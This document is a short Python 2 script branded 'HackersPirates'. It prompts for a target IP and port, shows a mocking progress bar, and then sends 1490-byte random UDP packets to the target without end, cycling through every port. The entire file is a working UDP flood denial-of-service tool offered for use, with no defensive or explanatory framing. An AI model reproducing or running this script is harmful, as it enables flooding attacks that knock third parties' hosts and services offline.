import sys
import os
import time
import socket
import random
#Codigo Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Hackers")
print
print "                "
print "{HackersPirates}"
print "                "
print
ip = raw_input("Set IP  : ")
port = input("Door       : ")

os.system("clear")
os.system("figlet Pirates!")
print "[    1%    ] F "
time.sleep(2)
print "[    25%   ] U"
time.sleep(2)
print "[    50%   ] C"
time.sleep(2)
print "[    100%  ] K"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "No %s system %s is safe:%s"% (sent,ip,port)
     if port == 65534:
       port = 1

